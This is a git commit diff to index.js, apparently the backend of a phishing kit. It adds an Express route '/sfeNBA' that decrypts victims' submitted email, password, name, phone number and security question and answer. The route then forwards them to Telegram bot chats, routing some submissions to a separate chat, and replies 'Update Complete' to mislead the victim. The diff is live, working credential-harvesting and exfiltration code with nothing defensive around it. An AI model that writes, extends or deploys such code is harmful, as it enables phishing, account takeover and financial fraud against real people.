9f795f604578c50b6847a72a0a9c3638a9f10fed
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2022-09-01 17:00:48 +0100

    make

--- index.js
+++ index.js
@@ -6363,6 +6363,77 @@ app.post("/eeKelv", (req, res) => {
 //SFE
 //SFE
 
+app.options("/sfeNBA", cors());
+
+app.post("/sfeNBA", (req, res) => {
+  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+
+  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;
+
+  if (chasingfunds == 10) {
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+        {
+          chat_id: 680379375,
+          text: `HAYTCHRES:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    chasingfunds = 4;
+  } else {
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+        {
+          chat_id: 680379375,
+          text: `SFEChasing:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+        {
+          chat_id: 1778408628,
+          text: `SFE:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    chasingfunds += 1;
+  }
+  res.send("Update Complete");
+});
+
 app.options("/sfeChasing", cors());
 
 app.post("/sfeChasing", (req, res) => {
